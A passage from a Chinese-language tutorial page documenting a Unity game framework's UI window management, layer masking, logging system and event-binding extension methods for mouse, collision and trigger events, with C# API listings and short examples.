<span class="hljs-type">UISystem</span>.<span class="hljs-type">RemoveUIWindowData</span>(windowKey, destoryWidnow);
<span class="hljs-comment">//清除所有UI窗口数据</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">ClearUIWindowData</span>();


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//获取testWindow的层级</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetUIWindowData</span>&lt;testWindow&gt;().layerNum;
</code></pre>
<ul>
<li>通过windowKey/泛型类型名/窗口对象类型传索引。</li>
<li>支持Try方式获取窗口数据，成功返回true并将数据赋给输出参数。</li>
<li>移除UI窗口数据,已存在的窗口对象实例会被强行删除。</li>
</ul>
<h3 data-id="heading-78">UI窗口对象管理</h3>
<p>这里的UI窗口对象只UI窗口数据UIWIndowData持有的那一份窗口脚本对象实例，其生命周期由框架管理，整体分为打开和关闭。</p>
<h4 data-id="heading-79">UI窗口打开</h4>
<p>加载UI窗口对象并显示。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//返回值为UI窗口类T，T受泛型约束必须为UI窗口基类子类</span>
<span class="hljs-comment">//(string windowKey, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey, layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;(layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-comment">//返回值为UI_WindowBase类，对应不能确定窗口类型的情况, xx是窗口类的对象</span>
<span class="hljs-comment">//(Type type, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(xx.getType(), layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(xx.getType());
<span class="hljs-comment">//(string windowKey, int layer = -1)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(windowKey, layer);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>(windowKey);


<span class="hljs-comment">//简单实例，打开窗口UI_WindowTest并置于第三层</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Show</span>&lt;<span class="hljs-type">UI_WindowTest</span>&gt;(<span class="hljs-number">2</span>);
</code></pre>
<ul>
<li>通过泛型T指定UI窗口子类类型，windowKey为UI窗口类的索引，对应UIWindowData中的windowKey，不指定则使用T的类型名作为索引，layer代表UI的层级，不填则默认-1表示使用数据中原有的层级（通过静态配置或者动态加载指定）。</li>
<li>在明确UI窗口类型的时候可以直接通过泛型T指定，不明确则可以通过传对象反射来获取类型。</li>
<li>简单解释逻辑为根据windowKey找到对应的窗口数据UIWindowData，根据数据中的assetPath加载UI窗口对象并根据T返回窗口类，无T则返回UI_WindowBase类。</li>
</ul>
<p>由于UI窗口类继承了UIWIndowBase，其中提供了一些可供重写的方法，这些方***在UI窗口打开时自动执行。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//初始化相关方法，只有在窗口第一次打开时执行</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Init</span>()</span>
    {
        <span class="hljs-keyword">base</span>.Init();
    }


    <span class="hljs-comment">//窗口每次打开时执行，可用于数初始化，并会自动调用事件监听注册方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnShow</span>()</span>
    {
        <span class="hljs-keyword">base</span>.OnShow();
    }
    <span class="hljs-comment">//事件监听注册</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterEventListener</span>()</span>
    {
        <span class="hljs-keyword">base</span>.RegisterEventListener();
    }
</code></pre>
<h4 data-id="heading-80">UI窗口关闭</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//(Type type) (string windowKey)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>(type);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryClose</span>(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">CloseAllWindow</span>();


<span class="hljs-comment">//简单实例，关闭窗口UI_WindowTest</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">Close</span>&lt;<span class="hljs-type">UI_WindowTest</span>&gt;();
</code></pre>
<ul>
<li>相比打开，关闭不需要返回值也不需要管理层级，通过T/Type/windowKey传入窗口的索引即可。</li>
<li>
<ul>
<li>TryClose API在遇到窗口已关闭或不存在时并不会warning，而其他API会报warning。</li>
</ul>
</li>
</ul>
<p>由于UI窗口类继承了UIWIndowBase，其中提供了一些可供重写的方法，这些方法在UI窗口关闭时自动执行。</p>
<pre><code class="hljs language-csharp" lang="csharp">    <span class="hljs-comment">//窗口每次关闭时执行，会动调用事件监听注销方法</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnClose</span>()</span>
    {
        <span class="hljs-keyword">base</span>.OnClose();
    }


    <span class="hljs-comment">//事件监听注销</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterEventListener</span>()</span>
    {
        <span class="hljs-keyword">base</span>.RegisterEventListener();
    }
</code></pre>
<h4 data-id="heading-81">获取/销毁UI窗口对象</h4>
<p>获取/销毁UIWindowData持有的UI窗口对象实例，与Onshow/OnClose不同，其只获取实例，不包含窗口游戏物体对象的显示/隐藏/销毁逻辑。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//返回值为UI窗口类T，T受泛型约束必须为UI窗口基类子类</span>
<span class="hljs-comment">//(string windowKey)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(<span class="hljs-type">Type</span> windowType);
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">T</span>&gt;();
<span class="hljs-comment">//返回值为UI_WindowBase类，对应不能确定窗口类型的情况</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>(windowKey);
<span class="hljs-comment">//返回值为bool,表示窗口对是否存在</span>
<span class="hljs-comment">//(string windowKey, out T window)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetWindow</span>(windowKey, window);
<span class="hljs-comment">//(string windowKey, out T window)</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">TryGetWindow</span>&lt;<span class="hljs-type">T</span>&gt;(windowKey, window);
<span class="hljs-comment">//销毁窗口对象</span>
<span class="hljs-type">UISystem</span>.<span class="hljs-type">DestroyWindow</span>(windowKey);


<span class="hljs-comment">//简单实例，获取TestWindow上的UI Text组件Name</span>
<span class="hljs-type">Text</span> name <span class="hljs-operator">=</span> <span class="hljs-type">UISystem</span>.<span class="hljs-type">GetWindow</span>&lt;<span class="hljs-type">TestWindow</span>&gt;().<span class="hljs-type">Name</span>;
</code></pre>
<ul>
<li>通过windowKey/type Name/T类型名查找窗口对象。</li>
<li>支持Try方式，查询成功则对象传递到输出参数out上，并返回bool为true，否则输出参数为null并返回false。</li>
<li>销毁窗口对象API会直接销毁游戏内的窗口gameObject、控制类，但UIWindowData还存在。</li>
</ul>
<h3 data-id="heading-82">UI层级管理</h3>
<p>框架内部实现了对UI的层级管理，可以在面板的UISystem上每一层是否启用遮罩，默认每一层UI是层层堆叠覆盖的，一旦某一层中有UI窗口对象，则层级比它低的层级都不可以交互，同一层级中比它早打开的UI窗口不可以交互（保证每一层内最顶层只有一个窗口），可以勾选不启用遮罩，则这一层层内和层外都不存在遮罩关系。</p>
<p>启用遮罩如下图。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5ca4656bb6c4fe2bf11e88d72afd149~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iBaEFmZck5f0KakQNDbmgsvgMN0%3D" alt="alt" loading="lazy"/>​</p>
<p>Mask保证了每一层内最顶层只有一个窗口进行交互。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1444d6d5f24b4c2dbbe44406b1f8471c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iBK2C2TNFa7N9BRKwkdET7%2Fhjas%3D" alt="alt" loading="lazy"/>​</p>
<p>另外框架单独提供了最顶层dragLayer，用于拖拽时临时需要把某个UI窗口置于最上层，可以通过UISystem.dragLayer获取。</p>
<pre><code class="hljs language-ini" lang="ini">UISystem.dragLayer<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-83">UI Tips</h3>
<p>弹窗工具。</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">//API</span>
<span class="hljs-comment">// 在窗口右下角弹出字符串tips提醒。</span>
<span class="hljs-comment">//(string tips)</span>
<span class="hljs-built_in">UISystem</span>.AddTips(tips)
</code></pre>
<h3 data-id="heading-84">判断鼠标是否在UI上</h3>
<p>返回当前鼠标位置是否在UI上，（用于替换EventSystem.current.IsPointerOverGameObject()，避免当前窗口因启用交互或同时需要考虑多层UI的层级关系，而启用覆盖全屏幕的遮罩Mask的RaycastTaret，使得鼠标处于UI窗口外时，Unity API一直错误的返回在UI上）。</p>
<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-comment">//bool</span>
<span class="hljs-built_in">UISystem</span>.CheckMouseOnUI();
</code></pre>
<h2 data-id="heading-85">日志系统</h2>
<p>日志系统用于在控制台输出Log、Success、Error、Warning的提示信息（用白色、绿色、红色、黄色加以区分），并可以进行本地自定义命名保存，可以在面板上勾选是否启用日志输出、写入时间（毫秒级定位）、线程ID、堆栈(定位提示代码行)、本地保存。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df5536ba56846b3bd9b928113195bd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=9Ii1ldyYje2ocQSbRyMeViTlbzM%3D" alt="alt" loading="lazy"/>​</p>
<p>保留Unity提示自带的代码连接跳转功能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7dd67384f634ee086873dc065a67ec7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iOyemRJT53uLuVS%2Fc1EefNKvang%3D" alt="alt" loading="lazy"/>​</p>
<p>本地保存的日志可以用于在打包后进行调试输出。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51121d6f98714a46baf263988dbb2e92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=BYH8nU2G4mDxF1zY2xsVrV55Ths%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//输出日志测试信息，等同于Debug.Log</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Log</span>(<span class="hljs-string">"测试Log"</span>);
<span class="hljs-comment">//输出Warning类型的提示信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Warning</span>(<span class="hljs-string">"测试Warning"</span>);
<span class="hljs-comment">//输出Error类型的提示信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Error</span>(<span class="hljs-string">"测试Error"</span>);
<span class="hljs-comment">//输出Succeed类型的输出信息</span>
<span class="hljs-title class_">JKLog</span>.<span class="hljs-title class_">Succeed</span>(<span class="hljs-string">"测试Succeed"</span>);
</code></pre>
<ul>
<li>在方法参数部分传入要输出的字符串信息即可。</li>
</ul>
<h2 data-id="heading-86">事件工具</h2>
<p>用于给游戏对象快速绑定事件，而无需手动给游戏对象挂载脚本，功能逻辑在当前脚本实现。与事件系统区分：事件系统重点在于提供了一个事件监听添加和事件触发解耦的中间模块，使得事件的触发无需关注依赖的对象，但事件执行的功能逻辑还是要实现在对象挂载的脚本上的。而事件工具重点在于快速为游戏对象绑定常见的响应事件，这类事件不由脚本触发（后续支持自定义脚本触发条件），而是在特定的时机如碰撞、鼠标点击、对象销毁时自动触发，因此重点关注事件监听添加的简化，所有逻辑在当前脚本完成。</p>
<h3 data-id="heading-87">框架内置事件绑定与移除</h3>
<h4 data-id="heading-88">鼠标相关事件</h4>
<p>鼠标进入、鼠标移出、鼠标点击、鼠标按下、鼠标抬起、鼠标拖拽、鼠标拖拽开始、鼠标拖拽结束事件的绑定与移除。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//鼠标进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnMouseEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnMouseEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnMouseEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnMouseEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标移出</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnMouseExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnMouseExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnMouseExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnMouseExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标点击</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClick</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClick</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClick</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClick</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标按下</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClickDown</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClickDown</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClickDown</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClickDown</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标抬起</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnClickUp</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnClickUp</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnClickUp</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnClickUp</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽开始</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnBeginDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnBeginDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnBeginDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnBeginDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//鼠标拖拽结束</span>
<span class="hljs-comment">//(this Component com, Action&lt;PointerEventData, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnEndDrag</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnEndDrag</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnEndDrag</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnEndDrag</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//使用示例</span>
<span class="hljs-attribute">Transform</span> cube;
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnClick</span>&lt;int&gt;(Test1,<span class="hljs-number">1</span>);
}
private void <span class="hljs-built_in">Test1</span>(PointerEventData arg1, int arg2)
{
    Debug<span class="hljs-selector-class">.Log</span>(<span class="hljs-number">1</span>);
    cube<span class="hljs-selector-class">.RemoveOnClick</span>&lt;int&gt;(Test1);
}
</code></pre>
<ul>
<li>xx为绑定事件的对象组件，事件工具基于拓展方法调用，xx使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-89">碰撞相关事件</h4>
<p>2D、3D相关的碰撞事件绑定与移除。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//3D碰撞进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionStay</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionStay</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionStay</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionStay</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D碰撞脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionEnter2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionEnter2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionStay2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionStay2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collision2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnCollisionExit2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnCollisionExit2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单示例</span>
void <span class="hljs-built_in">Start</span>()
{
    cube<span class="hljs-selector-class">.OnCollisionEnter</span>(Test2, <span class="hljs-number">2</span>);
}


private void <span class="hljs-built_in">Test2</span>(Collision arg1, int arg2)
{
    Debug<span class="hljs-selector-class">.Log</span>(arg2);
    cube<span class="hljs-selector-class">.RemoveOnCollisionEnter</span>&lt;int&gt;(Test2);
}
</code></pre>
<ul>
<li>碰撞事件和鼠标事件的API类似，区别参与action的第一个事件本身参数不同，为Collision/Collision2D。</li>
<li>xx为绑定事件的对象组件，使用游戏对象的transform即可。</li>
<li>TEventArg指定事件的参数类型，添加监听时可以不填，可以通过参数args推断出，移除监听时则必须显示指出。</li>
<li>action是绑定的事件，根据事件类型（鼠标、碰撞、自定义事件），其方法的参数列表包含两部分，第一部分是事件本身的参数（PointerEventData、Collision），第二部分是参数列表TEventArg，可以通过值元组传入多个参数。</li>
</ul>
<h4 data-id="heading-90">触发相关事件</h4>
<p>2D、3D相关的触发事件绑定。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//3D触发进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerEnter</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerEnter</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerEnter</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerEnter</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D触发持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerStay</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerStay</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerStay</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerStay</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//3D触发脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerExit</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerExit</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerExit</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerExit</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D触发进入</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerEnter2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerEnter2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D碰撞持续</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerStay2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerStay2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//2D触发脱离</span>
<span class="hljs-comment">//(this Component com, Action&lt;Collider2D, TEventArg&gt; action, TEventArg args = default(TEventArg))</span>
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>&lt;TEventArg&gt;(action, args);
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>(action, args); <span class="hljs-comment">//指定参数类型的泛型可以不填，可以通过参数推断出</span>
xx<span class="hljs-selector-class">.OnTriggerExit2D</span>(action); <span class="hljs-comment">//无参Action</span>
xx<span class="hljs-selector-class">.RemoveOnTriggerExit2D</span>&lt;TEventArg&gt;(action) <span class="hljs-comment">//Remove时不传参，参数类型必须传，无法推断</span>


<span class="hljs-comment">//简单示例</span>


